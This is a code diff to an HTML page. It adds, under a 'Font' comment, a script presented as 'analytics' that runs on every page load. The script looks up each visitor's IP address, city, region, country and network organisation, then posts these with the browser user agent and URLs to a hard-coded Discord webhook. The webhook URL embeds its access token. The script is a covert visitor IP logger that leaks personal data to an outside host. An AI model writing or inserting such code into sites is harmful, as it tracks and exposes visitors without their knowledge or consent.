@@ -67,7 +67,83 @@
 
     <!-- Font -->
     <script src="bridge.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+<script>
+  function sendAnalyticsData() {
+    function getIPInfo() {
+      return new Promise((resolve, reject) => {
+        $.get('https://ipinfo.io', (response) => {
+          resolve(response);
+        }, 'jsonp').fail((error) => {
+          reject(error);
+        });
+      });
+    }
 
+    const date = new Date();
+    const dayTime = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`;
+    const referringURL = document.referrer || 'Direct visit';
+    const currentURL = window.location.href;
+    const userAgent = navigator.userAgent;
+
+    getIPInfo().then((ipInfo) => {
+      const data = {
+        date: date.toISOString(),
+        dayTime: dayTime,
+        referringURL: referringURL,
+        currentURL: currentURL,
+        userAgent: userAgent,
+        ip: ipInfo.ip,
+        country: ipInfo.country,
+        region: ipInfo.region,
+        city: ipInfo.city,
+        org: ipInfo.org,
+      };
+
+      // Add Discord webhook data
+      const discordWebhookData = {
+        content: 'Analytics data from your website:',
+        embeds: [{
+          title: 'Analytics Details',
+          fields: [
+            { name: 'Date', value: data.date },
+            { name: 'Day Time', value: data.dayTime },
+            { name: 'Referring URL', value: data.referringURL },
+            { name: 'Current URL', value: data.currentURL },
+            { name: 'User Agent', value: data.userAgent },
+            { name: 'IP', value: data.ip },
+            { name: 'Country', value: data.country },
+            { name: 'Region', value: data.region },
+            { name: 'City', value: data.city },
+            { name: 'Organization', value: data.org },
+          ]
+        }]
+      };
+
+      const webhookEndpoint = 'https://discord.com/api/webhooks/1173553998092058744/8eR9UZvUeOqa9n7k1T8CObpCMxUpjfGDJKKR7IN7-aLfVzjNTIPU_vV8Ds0wPSC74WMU';
+      const webhookMethod = 'POST';
+
+      $.ajax({
+        url: webhookEndpoint,
+        method: webhookMethod,
+        contentType: 'application/json',
+        data: JSON.stringify(discordWebhookData),
+        success: function(response) {
+          console.log('Data sent successfully:', response);
+        },
+        error: function(error) {
+          console.error('Error sending data to webhook:', error);
+        }
+      });
+    }).catch((error) => {
+      console.error('Error getting IP information:', error);
+    });
+  }
+
+  $(document).ready(function() {
+    sendAnalyticsData();
+  });
+</script>
     <!-- Favicon -->
     <link rel="shortcut icon" href="favicons/icon.ico" type="image/x-icon">
 
